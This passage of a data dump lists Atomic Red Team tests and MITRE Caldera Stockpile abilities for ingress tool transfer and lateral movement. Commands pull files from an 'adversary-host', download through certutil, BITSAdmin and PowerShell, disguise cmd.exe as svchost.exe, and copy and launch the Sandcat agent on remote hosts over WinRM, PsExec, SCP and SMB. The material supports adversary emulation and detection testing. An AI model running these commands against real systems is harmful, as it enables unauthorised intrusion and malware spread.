                                                                                                                       'to '
                                                                                                                       'receive '
                                                                                                                       'rsync',
                                                                                                        'type': 'Path'},
                                                                                         'remote_host': {'default': 'adversary-host',
                                                                                                         'description': 'Remote '
                                                                                                                        'host '
                                                                                                                        'to '
                                                                                                                        'copy '
                                                                                                                        'from',
                                                                                                         'type': 'String'},
                                                                                         'remote_path': {'default': '/tmp/adversary-rsync/',
                                                                                                         'description': 'Path '
                                                                                                                        'of '
                                                                                                                        'folder '
                                                                                                                        'to '
                                                                                                                        'copy',
                                                                                                         'type': 'Path'},
                                                                                         'username': {'default': 'adversary',
                                                                                                      'description': 'User '
                                                                                                                     'account '
                                                                                                                     'to '
                                                                                                                     'authenticate '
                                                                                                                     'on '
                                                                                                                     'remote '
                                                                                                                     'host',
                                                                                                      'type': 'String'}},
                                                                     'name': 'rsync '
                                                                             'remote '
                                                                             'file '
                                                                             'copy '
                                                                             '(pull)',
                                                                     'supported_platforms': ['linux',
                                                                                             'macos']},
                                                                    {'auto_generated_guid': '83a49600-222b-4866-80a0-37736ad29344',
                                                                     'description': 'Utilize '
                                                                                    'scp '
                                                                                    'to '
                                                                                    'perform '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'file '
                                                                                    'copy '
                                                                                    '(push)\n',
                                                                     'executor': {'command': 'scp '
                                                                                             '#{local_file} '
                                                                                             '#{username}@#{remote_host}:#{remote_path}\n',
                                                                                  'name': 'bash'},
                                                                     'input_arguments': {'local_file': {'default': '/tmp/adversary-scp',
                                                                                                        'description': 'Path '
                                                                                                                       'of '
                                                                                                                       'file '
                                                                                                                       'to '
                                                                                                                       'copy',
                                                                                                        'type': 'Path'},
                                                                                         'remote_host': {'default': 'victim-host',
                                                                                                         'description': 'Remote '
                                                                                                                        'host '
                                                                                                                        'to '
                                                                                                                        'copy '
                                                                                                                        'toward',
                                                                                                         'type': 'String'},
                                                                                         'remote_path': {'default': '/tmp/victim-files/',
                                                                                                         'description': 'Remote '
                                                                                                                        'path '
                                                                                                                        'to '
                                                                                                                        'receive '
                                                                                                                        'scp',
                                                                                                         'type': 'Path'},
                                                                                         'username': {'default': 'victim',
                                                                                                      'description': 'User '
                                                                                                                     'account '
                                                                                                                     'to '
                                                                                                                     'authenticate '
                                                                                                                     'on '
                                                                                                                     'remote '
                                                                                                                     'host',
                                                                                                      'type': 'String'}},
                                                                     'name': 'scp '
                                                                             'remote '
                                                                             'file '
                                                                             'copy '
                                                                             '(push)',
                                                                     'supported_platforms': ['linux',
                                                                                             'macos']},
                                                                    {'auto_generated_guid': 'b9d22b9a-9778-4426-abf0-568ea64e9c33',
                                                                     'description': 'Utilize '
                                                                                    'scp '
                                                                                    'to '
                                                                                    'perform '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'file '
                                                                                    'copy '
                                                                                    '(pull)\n',
                                                                     'executor': {'command': 'scp '
                                                                                             '#{username}@#{remote_host}:#{remote_file} '
                                                                                             '#{local_path}\n',
                                                                                  'name': 'bash'},
                                                                     'input_arguments': {'local_path': {'default': '/tmp/victim-files/',
                                                                                                        'description': 'Local '
                                                                                                                       'path '
                                                                                                                       'to '
                                                                                                                       'receive '
                                                                                                                       'scp',
                                                                                                        'type': 'Path'},
                                                                                         'remote_file': {'default': '/tmp/adversary-scp',
                                                                                                         'description': 'Path '
                                                                                                                        'of '
                                                                                                                        'file '
                                                                                                                        'to '
                                                                                                                        'copy',
                                                                                                         'type': 'Path'},
                                                                                         'remote_host': {'default': 'adversary-host',
                                                                                                         'description': 'Remote '
                                                                                                                        'host '
                                                                                                                        'to '
                                                                                                                        'copy '
                                                                                                                        'from',
                                                                                                         'type': 'String'},
                                                                                         'username': {'default': 'adversary',
                                                                                                      'description': 'User '
                                                                                                                     'account '
                                                                                                                     'to '
                                                                                                                     'authenticate '
                                                                                                                     'on '
                                                                                                                     'remote '
                                                                                                                     'host',
                                                                                                      'type': 'String'}},
                                                                     'name': 'scp '
                                                                             'remote '
                                                                             'file '
                                                                             'copy '
                                                                             '(pull)',
                                                                     'supported_platforms': ['linux',
                                                                                             'macos']},
                                                                    {'auto_generated_guid': 'f564c297-7978-4aa9-b37a-d90477feea4e',
                                                                     'description': 'Utilize '
                                                                                    'sftp '
                                                                                    'to '
                                                                                    'perform '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'file '
                                                                                    'copy '
                                                                                    '(push)\n',
                                                                     'executor': {'command': 'sftp '
                                                                                             '#{username}@#{remote_host}:#{remote_path} '
                                                                                             '<<< '
                                                                                             "$'put "
                                                                                             "#{local_file}'\n",
                                                                                  'name': 'bash'},
                                                                     'input_arguments': {'local_file': {'default': '/tmp/adversary-sftp',
                                                                                                        'description': 'Path '
                                                                                                                       'of '
                                                                                                                       'file '
                                                                                                                       'to '
                                                                                                                       'copy',
                                                                                                        'type': 'Path'},
                                                                                         'remote_host': {'default': 'victim-host',
                                                                                                         'description': 'Remote '
                                                                                                                        'host '
                                                                                                                        'to '
                                                                                                                        'copy '
                                                                                                                        'toward',
                                                                                                         'type': 'String'},
                                                                                         'remote_path': {'default': '/tmp/victim-files/',
                                                                                                         'description': 'Remote '
                                                                                                                        'path '
                                                                                                                        'to '
                                                                                                                        'receive '
                                                                                                                        'sftp',
                                                                                                         'type': 'Path'},
                                                                                         'username': {'default': 'victim',
                                                                                                      'description': 'User '
                                                                                                                     'account '
                                                                                                                     'to '
                                                                                                                     'authenticate '
                                                                                                                     'on '
                                                                                                                     'remote '
                                                                                                                     'host',
                                                                                                      'type': 'String'}},
                                                                     'name': 'sftp '
                                                                             'remote '
                                                                             'file '
                                                                             'copy '
                                                                             '(push)',
                                                                     'supported_platforms': ['linux',
                                                                                             'macos']},
                                                                    {'auto_generated_guid': '0139dba1-f391-405e-a4f5-f3989f2c88ef',
                                                                     'description': 'Utilize '
                                                                                    'sftp '
                                                                                    'to '
                                                                                    'perform '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'file '
                                                                                    'copy '
                                                                                    '(pull)\n',
                                                                     'executor': {'command': 'sftp '
                                                                                             '#{username}@#{remote_host}:#{remote_file} '
                                                                                             '#{local_path}\n',
                                                                                  'name': 'bash'},
                                                                     'input_arguments': {'local_path': {'default': '/tmp/victim-files/',
                                                                                                        'description': 'Local '
                                                                                                                       'path '
                                                                                                                       'to '
                                                                                                                       'receive '
                                                                                                                       'sftp',
                                                                                                        'type': 'Path'},
                                                                                         'remote_file': {'default': '/tmp/adversary-sftp',
                                                                                                         'description': 'Path '
                                                                                                                        'of '
                                                                                                                        'file '
                                                                                                                        'to '
                                                                                                                        'copy',
                                                                                                         'type': 'Path'},
                                                                                         'remote_host': {'default': 'adversary-host',
                                                                                                         'description': 'Remote '
                                                                                                                        'host '
                                                                                                                        'to '
                                                                                                                        'copy '
                                                                                                                        'from',
                                                                                                         'type': 'String'},
                                                                                         'username': {'default': 'adversary',
                                                                                                      'description': 'User '
                                                                                                                     'account '
                                                                                                                     'to '
                                                                                                                     'authenticate '
                                                                                                                     'on '
                                                                                                                     'remote '
                                                                                                                     'host',
                                                                                                      'type': 'String'}},
                                                                     'name': 'sftp '
                                                                             'remote '
                                                                             'file '
                                                                             'copy '
                                                                             '(pull)',
                                                                     'supported_platforms': ['linux',
                                                                                             'macos']},
                                                                    {'auto_generated_guid': 'dd3b61dd-7bbc-48cd-ab51-49ad1a776df0',
                                                                     'description': 'Use '
                                                                                    'certutil '
                                                                                    '-urlcache '
                                                                                    'argument '
                                                                                    'to '
                                                                                    'download '
                                                                                    'a '
                                                                                    'file '
                                                                                    'from '
                                                                                    'the '
                                                                                    'web. '
                                                                                    'Note '
                                                                                    '- '
                                                                                    '/urlcache '
                                                                                    'also '
                                                                                    'works!\n',
                                                                     'executor': {'cleanup_command': 'del '
                                                                                                     '#{local_path} '
                                                                                                     '>nul '
                                                                                                     '2>&1\n',
                                                                                  'command': 'cmd '
                                                                                             '/c '
                                                                                             'certutil '
                                                                                             '-urlcache '
                                                                                             '-split '
                                                                                             '-f '
                                                                                             '#{remote_file} '
                                                                                             '#{local_path}\n',
                                                                                  'name': 'command_prompt'},
                                                                     'input_arguments': {'local_path': {'default': 'Atomic-license.txt',
                                                                                                        'description': 'Local '
                                                                                                                       'path '
                                                                                                                       'to '
                                                                                                                       'place '
                                                                                                                       'file',
                                                                                                        'type': 'Path'},
                                                                                         'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt',
                                                                                                         'description': 'URL '
                                                                                                                        'of '
                                                                                                                        'file '
                                                                                                                        'to '
                                                                                                                        'copy',
                                                                                                         'type': 'Url'}},
                                                                     'name': 'certutil '
                                                                             'download '
                                                                             '(urlcache)',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': 'ffd492e3-0455-4518-9fb1-46527c9f241b',
                                                                     'description': 'Use '
                                                                                    'certutil '
                                                                                    '-verifyctl '
                                                                                    'argument '
                                                                                    'to '
                                                                                    'download '
                                                                                    'a '
                                                                                    'file '
                                                                                    'from '
                                                                                    'the '
                                                                                    'web. '
                                                                                    'Note '
                                                                                    '- '
                                                                                    '/verifyctl '
                                                                                    'also '
                                                                                    'works!\n',
                                                                     'executor': {'cleanup_command': 'Remove-Item '
                                                                                                     '"certutil-$(Get-Date '
                                                                                                     '-format '
                                                                                                     'yyyy_MM_dd)" '
                                                                                                     '-Force '
                                                                                                     '-Recurse '
                                                                                                     '-ErrorAction '
                                                                                                     'Ignore\n',
                                                                                  'command': '$datePath '
                                                                                             '= '
                                                                                             '"certutil-$(Get-Date '
                                                                                             '-format '
                                                                                             'yyyy_MM_dd)"\n'
                                                                                             'New-Item '
                                                                                             '-Path '
                                                                                             '$datePath '
                                                                                             '-ItemType '
                                                                                             'Directory\n'
                                                                                             'Set-Location '
                                                                                             '$datePath\n'
                                                                                             'certutil '
                                                                                             '-verifyctl '
                                                                                             '-split '
                                                                                             '-f '
                                                                                             '#{remote_file}\n'
                                                                                             'Get-ChildItem '
                                                                                             '| '
                                                                                             'Where-Object '
                                                                                             '{$_.Name '
                                                                                             '-notlike '
                                                                                             '"*.txt"} '
                                                                                             '| '
                                                                                             'Foreach-Object '
                                                                                             '{ '
                                                                                             'Move-Item '
                                                                                             '$_.Name '
                                                                                             '-Destination '
                                                                                             '#{local_path} '
                                                                                             '}\n',
                                                                                  'name': 'powershell'},
                                                                     'input_arguments': {'local_path': {'default': 'Atomic-license.txt',
                                                                                                        'description': 'Local '
                                                                                                                       'path '
                                                                                                                       'to '
                                                                                                                       'place '
                                                                                                                       'file',
                                                                                                        'type': 'Path'},
                                                                                         'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt',
                                                                                                         'description': 'URL '
                                                                                                                        'of '
                                                                                                                        'file '
                                                                                                                        'to '
                                                                                                                        'copy',
                                                                                                         'type': 'Url'}},
                                                                     'name': 'certutil '
                                                                             'download '
                                                                             '(verifyctl)',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': 'a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b',
                                                                     'description': 'This '
                                                                                    'test '
                                                                                    'uses '
                                                                                    'BITSAdmin.exe '
                                                                                    'to '
                                                                                    'schedule '
                                                                                    'a '
                                                                                    'BITS '
                                                                                    'job '
                                                                                    'for '
                                                                                    'the '
                                                                                    'download '
                                                                                    'of '
                                                                                    'a '
                                                                                    'file.\n'
                                                                                    'This '
                                                                                    'technique '
                                                                                    'is '
                                                                                    'used '
                                                                                    'by '
                                                                                    'Qbot '
                                                                                    'malware '
                                                                                    'to '
                                                                                    'download '
                                                                                    'payloads.\n',
                                                                     'executor': {'command': 'C:\\Windows\\System32\\bitsadmin.exe '
                                                                                             '/transfer '
                                                                                             '#{bits_job_name} '
                                                                                             '/Priority '
                                                                                             'HIGH '
                                                                                             '#{remote_file} '
                                                                                             '#{local_path}\n',
                                                                                  'name': 'command_prompt'},
                                                                     'input_arguments': {'bits_job_name': {'default': 'qcxjb7',
                                                                                                           'description': 'Name '
                                                                                                                          'of '
                                                                                                                          'the '
                                                                                                                          'created '
                                                                                                                          'BITS '
                                                                                                                          'job',
                                                                                                           'type': 'String'},
                                                                                         'local_path': {'default': '%temp%\\Atomic-license.txt',
                                                                                                        'description': 'Local '
                                                                                                                       'path '
                                                                                                                       'to '
                                                                                                                       'place '
                                                                                                                       'file',
                                                                                                        'type': 'Path'},
                                                                                         'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt',
                                                                                                         'description': 'URL '
                                                                                                                        'of '
                                                                                                                        'file '
                                                                                                                        'to '
                                                                                                                        'copy',
                                                                                                         'type': 'Url'}},
                                                                     'name': 'Windows '
                                                                             '- '
                                                                             'BITSAdmin '
                                                                             'BITS '
                                                                             'Download',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': '42dc4460-9aa6-45d3-b1a6-3955d34e1fe8',
                                                                     'description': 'This '
                                                                                    'test '
                                                                                    'uses '
                                                                                    'PowerShell '
                                                                                    'to '
                                                                                    'download '
                                                                                    'a '
                                                                                    'payload.\n'
                                                                                    'This '
                                                                                    'technique '
                                                                                    'is '
                                                                                    'used '
                                                                                    'by '
                                                                                    'multiple '
                                                                                    'adversaries '
                                                                                    'and '
                                                                                    'malware '
                                                                                    'families.\n',
                                                                     'executor': {'cleanup_command': 'Remove-Item '
                                                                                                     '#{destination_path} '
                                                                                                     '-Force '
                                                                                                     '-ErrorAction '
                                                                                                     'Ignore\n',
                                                                                  'command': '(New-Object '
                                                                                             'System.Net.WebClient).DownloadFile("#{remote_file}", '
                                                                                             '"#{destination_path}")\n',
                                                                                  'name': 'powershell'},
                                                                     'input_arguments': {'destination_path': {'default': '$env:TEMP\\Atomic-license.txt',
                                                                                                              'description': 'Destination '
                                                                                                                             'path '
                                                                                                                             'to '
                                                                                                                             'file',
                                                                                                              'type': 'Path'},
                                                                                         'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt',
                                                                                                         'description': 'URL '
                                                                                                                        'of '
                                                                                                                        'file '
                                                                                                                        'to '
                                                                                                                        'copy',
                                                                                                         'type': 'Url'}},
                                                                     'name': 'Windows '
                                                                             '- '
                                                                             'PowerShell '
                                                                             'Download',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': '2ca61766-b456-4fcf-a35a-1233685e1cad',
                                                                     'description': 'OSTap '
                                                                                    'copies '
                                                                                    'itself '
                                                                                    'in '
                                                                                    'a '
                                                                                    'specfic '
                                                                                    'way '
                                                                                    'to '
                                                                                    'shares '
                                                                                    'and '
                                                                                    'secondary '
                                                                                    'drives. '
                                                                                    'This '
                                                                                    'emulates '
                                                                                    'the '
                                                                                    'activity.\n',
                                                                     'executor': {'command': 'pushd '
                                                                                             '#{destination_path}\n'
                                                                                             'echo '
                                                                                             'var '
                                                                                             'fileObject '
                                                                                             '= '
                                                                                             'WScript.createobject("Scripting.FileSystemObject");var '
                                                                                             'newfile '
                                                                                             '= '
                                                                                             'fileObject.CreateTextFile("AtomicTestFileT1105.js", '
                                                                                             'true);newfile.WriteLine("This '
                                                                                             'is '
                                                                                             'an '
                                                                                             'atomic '
                                                                                             'red '
                                                                                             'team '
                                                                                             'test '
                                                                                             'file '
                                                                                             'for '
                                                                                             'T1105. '
                                                                                             'It '
                                                                                             'simulates '
                                                                                             'how '
                                                                                             'OSTap '
                                                                                             'worms '
                                                                                             'accross '
                                                                                             'network '
                                                                                             'shares '
                                                                                             'and '
                                                                                             'drives.");newfile.Close(); '
                                                                                             '> '
                                                                                             'AtomicTestT1105.js\n'
                                                                                             'CScript.exe '
                                                                                             'AtomicTestT1105.js '
                                                                                             '//E:JScript\n'
                                                                                             'del '
                                                                                             'AtomicTestT1105.js '
                                                                                             '/Q '
                                                                                             '>nul '
                                                                                             '2>&1\n'
                                                                                             'del '
                                                                                             'AtomicTestFileT1105.js '
                                                                                             '/Q '
                                                                                             '>nul '
                                                                                             '2>&1\n'
                                                                                             'popd\n',
                                                                                  'elevation_required': True,
                                                                                  'name': 'command_prompt'},
                                                                     'input_arguments': {'destination_path': {'default': '\\\\localhost\\C$',
                                                                                                              'description': 'Path '
                                                                                                                             'to '
                                                                                                                             'create '
                                                                                                                             'remote '
                                                                                                                             'file '
                                                                                                                             'at. '
                                                                                                                             'Default '
                                                                                                                             'is '
                                                                                                                             'local '
                                                                                                                             'admin '
                                                                                                                             'share.',
                                                                                                              'type': 'String'}},
                                                                     'name': 'OSTAP '
                                                                             'Worming '
                                                                             'Activity',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': 'fa5a2759-41d7-4e13-a19c-e8f28a53566f',
                                                                     'description': 'svchost.exe '
                                                                                    'writing '
                                                                                    'a '
                                                                                    'non-Microsoft '
                                                                                    'Office '
                                                                                    'file '
                                                                                    'to '
                                                                                    'a '
                                                                                    'file '
                                                                                    'with '
                                                                                    'a '
                                                                                    'UNC '
                                                                                    'path.\n'
                                                                                    'Upon '
                                                                                    'successful '
                                                                                    'execution, '
                                                                                    'this '
                                                                                    'will '
                                                                                    'rename '
                                                                                    'cmd.exe '
                                                                                    'as '
                                                                                    'svchost.exe '
                                                                                    'and '
                                                                                    'move '
                                                                                    'it '
                                                                                    'to '
                                                                                    '`c:\\`, '
                                                                                    'then '
                                                                                    'execute '
                                                                                    'svchost.exe '
                                                                                    'with '
                                                                                    'output '
                                                                                    'to '
                                                                                    'a '
                                                                                    'txt '
                                                                                    'file.\n',
                                                                     'executor': {'cleanup_command': 'del '
                                                                                                     'C:\\T1105.txt '
                                                                                                     '>nul '
                                                                                                     '2>&1\n'
                                                                                                     'del '
                                                                                                     'C:\\\\svchost.exe '
                                                                                                     '>nul '
                                                                                                     '2>&1\n',
                                                                                  'command': 'copy '
                                                                                             'C:\\Windows\\System32\\cmd.exe '
                                                                                             'C:\\svchost.exe\n'
                                                                                             'C:\\svchost.exe '
                                                                                             '/c '
                                                                                             'echo '
                                                                                             'T1105 '
                                                                                             '> '
                                                                                             '\\\\localhost\\c$\\T1105.txt\n',
                                                                                  'elevation_required': True,
                                                                                  'name': 'command_prompt'},
                                                                     'name': 'svchost '
                                                                             'writing '
                                                                             'a '
                                                                             'file '
                                                                             'to '
                                                                             'a '
                                                                             'UNC '
                                                                             'path',
                                                                     'supported_platforms': ['windows']}],
                                                   'attack_technique': 'T1105',
                                                   'display_name': 'Ingress '
                                                                   'Tool '
                                                                   'Transfer'}},
 {'Mitre Stockpile - Copy Sandcat file using PowerShell': {'description': 'Copy '
                                                                          'Sandcat '
                                                                          'file '
                                                                          'using '
                                                                          'PowerShell',
                                                           'id': '3734aa1e-c536-42b3-8912-4c91b8bdce90',
                                                           'name': 'Copy '
                                                                   'Sandcat '
                                                                   'File using '
                                                                   'Powershell',
                                                           'platforms': {'windows': {'psh': {'cleanup': 'del '
                                                                                                        'sandcat.go-windows; '
                                                                                                        'Invoke-Command '
                                                                                                        '-ComputerName',
                                                                                             'command': '$server="#{server}";\n'
                                                                                                        '$sharePath="#{share}";\n'
                                                                                                        'Set-Location '
                                                                                                        '$sharePath;$url="$($server)/file/download";\n'
                                                                                                        '$wc=New-Object '
                                                                                                        'System.Net.WebClient;$wc.Headers.add("platform","windows");\n'
                                                                                                        '$wc.Headers.add("file","sandcat.go");($data=$wc.DownloadData($url)) '
                                                                                                        '-and\n'
                                                                                                        '($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""))\n'
                                                                                                        '-and '
                                                                                                        '([io.file]::WriteAllBytes("$($sharePath)$name.exe",$data));\n'
                                                                                                        '$startServer="$($sharePath)$name.exe '
                                                                                                        '-server '
                                                                                                        '$($server) '
                                                                                                        '";Invoke-Command\n'
                                                                                                        '-ScriptBlock '
                                                                                                        '{Param([string]$startServer, '
                                                                                                        '$sharePath, '
                                                                                                        '$name, '
                                                                                                        '$server)  '
                                                                                                        'Invoke-WmiMethod\n'
                                                                                                        '-Class '
                                                                                                        'Win32_Process '
                                                                                                        '-Name '
                                                                                                        'Create '
                                                                                                        '-ArgumentList '
                                                                                                        '"$($sharePath)$name.exe\n'
                                                                                                        '-server '
                                                                                                        '$server '
                                                                                                        '-v" '
                                                                                                        '} '
                                                                                                        '-ComputerName '
                                                                                                        '#{remote.host.name} '
                                                                                                        '-ArgumentList '
                                                                                                        '$startServer, '
                                                                                                        '$sharePath, '
                                                                                                        '$name, '
                                                                                                        '$server\n',
                                                                                             'payloads': ['sandcat.go-windows']}}},
                                                           'tactic': 'lateral-movement',
                                                           'technique': {'attack_id': 'T1105',
                                                                         'name': 'Remote '
                                                                                 'File '
                                                                                 'Copy'}}},
 {'Mitre Stockpile - Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP': {'description': 'Copy '
                                                                                                       '54ndc47 '
                                                                                                       'to '
                                                                                                       'remote '
                                                                                                       'host '
                                                                                                       '(powershell '
                                                                                                       '5 '
                                                                                                       'or '
                                                                                                       'newer '
                                                                                                       'only) '
                                                                                                       'or '
                                                                                                       'SCP',
                                                                                        'id': '4908fdc4-74fc-4d7c-8935-26d11ad26a8d',
                                                                                        'name': 'Copy '
                                                                                                '54ndc47 '
                                                                                                '(WinRM '
                                                                                                'and '
                                                                                                'SCP)',
                                                                                        'platforms': {'darwin': {'sh': {'cleanup': 'ssh '
                                                                                                                                   '-o '
                                                                                                                                   'ConnectTimeout=3 '
                                                                                                                                   '#{remote.ssh.cmd} '
                                                                                                                                   "'rm "
                                                                                                                                   '-f '
                                                                                                                                   "sandcat.go'\n",
                                                                                                                        'command': 'scp '
                                                                                                                                   '-o '
                                                                                                                                   'StrictHostKeyChecking=no '
                                                                                                                                   '-o '
                                                                                                                                   'UserKnownHostsFile=/dev/null '
                                                                                                                                   '-o '
                                                                                                                                   'ConnectTimeout=3 '
                                                                                                                                   'sandcat.go-darwin '
                                                                                                                                   '#{remote.ssh.cmd}:~/sandcat.go\n',
                                                                                                                        'payloads': ['sandcat.go-darwin']}},
                                                                                                      'linux': {'sh': {'cleanup': 'ssh '
                                                                                                                                  '-o '
                                                                                                                                  'ConnectTimeout=3 '
                                                                                                                                  '-o '
                                                                                                                                  'StrictHostKeyChecking=no '
                                                                                                                                  '#{remote.ssh.cmd} '
                                                                                                                                  "'rm "
                                                                                                                                  '-f '
                                                                                                                                  "sandcat.go'\n",
                                                                                                                       'command': 'scp '
                                                                                                                                  '-o '
                                                                                                                                  'StrictHostKeyChecking=no '
                                                                                                                                  '-o '
                                                                                                                                  'UserKnownHostsFile=/dev/null '
                                                                                                                                  '-o '
                                                                                                                                  'ConnectTimeout=3 '
                                                                                                                                  'sandcat.go-linux '
                                                                                                                                  '#{remote.ssh.cmd}:~/sandcat.go\n',
                                                                                                                       'payloads': ['sandcat.go-linux']}},
                                                                                                      'windows': {'psh,pwsh': {'cleanup': '$job '
                                                                                                                                          '= '
                                                                                                                                          'Start-Job '
                                                                                                                                          '-ScriptBlock '
                                                                                                                                          '{\n'
                                                                                                                                          '  '
                                                                                                                                          '$username '
                                                                                                                                          '= '
                                                                                                                                          '"#{domain.user.name}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$password '
                                                                                                                                          '= '
                                                                                                                                          '"#{domain.user.password}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$secstr '
                                                                                                                                          '= '
                                                                                                                                          'New-Object '
                                                                                                                                          '-TypeName '
                                                                                                                                          'System.Security.SecureString;\n'
                                                                                                                                          '  '
                                                                                                                                          '$password.ToCharArray() '
                                                                                                                                          '| '
                                                                                                                                          'ForEach-Object '
                                                                                                                                          '{$secstr.AppendChar($_)};\n'
                                                                                                                                          '  '
                                                                                                                                          '$cred '
                                                                                                                                          '= '
                                                                                                                                          'New-Object '
                                                                                                                                          '-Typename '
                                                                                                                                          'System.Management.Automation.PSCredential '
                                                                                                                                          '-Argumentlist '
                                                                                                                                          '$username, '
                                                                                                                                          '$secstr;\n'
                                                                                                                                          '  '
                                                                                                                                          '$session '
                                                                                                                                          '= '
                                                                                                                                          'New-PSSession '
                                                                                                                                          '-ComputerName '
                                                                                                                                          '"#{remote.host.name}" '
                                                                                                                                          '-Credential '
                                                                                                                                          '$cred;\n'
                                                                                                                                          '  '
                                                                                                                                          'Invoke-Command '
                                                                                                                                          '-Session '
                                                                                                                                          '$session '
                                                                                                                                          '-Command '
                                                                                                                                          '{Remove-Item '
                                                                                                                                          '"C:\\Users\\Public\\svchost.exe" '
                                                                                                                                          '-force};\n'
                                                                                                                                          '  '
                                                                                                                                          'Start-Sleep '
                                                                                                                                          '-s '
                                                                                                                                          '5;\n'
                                                                                                                                          '  '
                                                                                                                                          'Remove-PSSession '
                                                                                                                                          '-Session '
                                                                                                                                          '$session;\n'
                                                                                                                                          '};\n'
                                                                                                                                          'Receive-Job '
                                                                                                                                          '-Job '
                                                                                                                                          '$job '
                                                                                                                                          '-Wait;\n',
                                                                                                                               'command': '$job '
                                                                                                                                          '= '
                                                                                                                                          'Start-Job '
                                                                                                                                          '-ScriptBlock '
                                                                                                                                          '{\n'
                                                                                                                                          '  '
                                                                                                                                          '$username '
                                                                                                                                          '= '
                                                                                                                                          '"#{domain.user.name}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$password '
                                                                                                                                          '= '
                                                                                                                                          '"#{domain.user.password}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$secstr '
                                                                                                                                          '= '
                                                                                                                                          'New-Object '
                                                                                                                                          '-TypeName '
                                                                                                                                          'System.Security.SecureString;\n'
                                                                                                                                          '  '
                                                                                                                                          '$password.ToCharArray() '
                                                                                                                                          '| '
                                                                                                                                          'ForEach-Object '
                                                                                                                                          '{$secstr.AppendChar($_)};\n'
                                                                                                                                          '  '
                                                                                                                                          '$cred '
                                                                                                                                          '= '
                                                                                                                                          'New-Object '
                                                                                                                                          '-Typename '
                                                                                                                                          'System.Management.Automation.PSCredential '
                                                                                                                                          '-Argumentlist '
                                                                                                                                          '$username, '
                                                                                                                                          '$secstr;\n'
                                                                                                                                          '  '
                                                                                                                                          '$session '
                                                                                                                                          '= '
                                                                                                                                          'New-PSSession '
                                                                                                                                          '-ComputerName '
                                                                                                                                          '"#{remote.host.name}" '
                                                                                                                                          '-Credential '
                                                                                                                                          '$cred;\n'
                                                                                                                                          '  '
                                                                                                                                          '$location '
                                                                                                                                          '= '
                                                                                                                                          '"#{location}";\n'
                                                                                                                                          '  '
                                                                                                                                          '$exe '
                                                                                                                                          '= '
                                                                                                                                          '"#{exe_name}";\n'
                                                                                                                                          '  '
                                                                                                                                          'Copy-Item '
                                                                                                                                          '$location.replace($exe, '
                                                                                                                                          '"sandcat.go-windows") '
                                                                                                                                          '-Destination '
                                                                                                                                          '"C:\\Users\\Public\\svchost.exe" '
                                                                                                                                          '-ToSession '
                                                                                                                                          '$session;\n'
                                                                                                                                          '  '
                                                                                                                                          'Start-Sleep '
                                                                                                                                          '-s '
                                                                                                                                          '5;\n'
                                                                                                                                          '  '
                                                                                                                                          'Remove-PSSession '
                                                                                                                                          '-Session '
                                                                                                                                          '$session;\n'
                                                                                                                                          '};\n'
                                                                                                                                          'Receive-Job '
                                                                                                                                          '-Job '
                                                                                                                                          '$job '
                                                                                                                                          '-Wait;\n',
                                                                                                                               'payloads': ['sandcat.go-windows']}}},
                                                                                        'tactic': 'lateral-movement',
                                                                                        'technique': {'attack_id': 'T1105',
                                                                                                      'name': 'Remote '
                                                                                                              'File '
                                                                                                              'Copy'}}},
 {'Mitre Stockpile - Copy Sandcat file using PsExec on CMD': {'description': 'Copy '
                                                                             'Sandcat '
                                                                             'file '
                                                                             'using '
                                                                             'PsExec '
                                                                             'on '
                                                                             'CMD',
                                                              'id': '620b674a-7655-436c-b645-bc3e8ea51abd',
                                                              'name': 'Copy '
                                                                      'Sandcat '
                                                                      'File '
                                                                      'using '
                                                                      'PsExec '
                                                                      'on CMD',
                                                              'platforms': {'windows': {'cmd': {'cleanup': 'del '
                                                                                                           '/f '
                                                                                                           'sandcat.go-windows '
                                                                                                           '&& '
                                                                                                           'del '
                                                                                                           '/f '
                                                                                                           '\\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe',
                                                                                                'command': 'net '
                                                                                                           '/y '
                                                                                                           'use '
                                                                                                           '\\\\#{remote.host.name} '
                                                                                                           '& '
                                                                                                           'copy '
                                                                                                           '/y '
                                                                                                           'sandcat.go-windows\n'
                                                                                                           '\\\\#{remote.host.name}\\Users\\Public '
                                                                                                           '& '
                                                                                                           '#{psexec.path} '
                                                                                                           '-accepteula '
                                                                                                           '\\\\#{remote.host.name}\n'
                                                                                                           'cmd '
                                                                                                           '/c '
                                                                                                           'start '
                                                                                                           'C:\\Users\\Public\\sandcat.go-windows '
                                                                                                           '-server '
                                                                                                           '#{server} '
                                                                                                           '-v\n',
                                                                                                'payloads': ['sandcat.go-windows']}}},
                                                              'tactic': 'lateral-movement',
                                                              'technique': {'attack_id': 'T1105',
                                                                            'name': 'Remote '
                                                                                    'File '
                                                                                    'Copy'}}},
 {'Mitre Stockpile - Copy 54ndc47 to remote host (SMB)': {'description': 'Copy '
                                                                         '54ndc47 '
                                                                         'to '
                                                                         'remote '
                                                                         'host '
                                                                         '(SMB)',
                                                          'id': '65048ec1-f7ca-49d3-9410-10813e472b30',
                                                          'name': 'Copy '
                                                                  '54ndc47 '
                                                                  '(SMB)',
                                                          'platforms': {'windows': {'psh': {'cleanup': '$drive '
                                                                                                       '= '
                                                                                                       '"\\\\#{remote.host.fqdn}\\C$";\n'
                                                                                                       'Remove-Item '
                                                                                                       '-Path '
                                                                                                       '$drive"\\Users\\Public\\svchost.exe" '
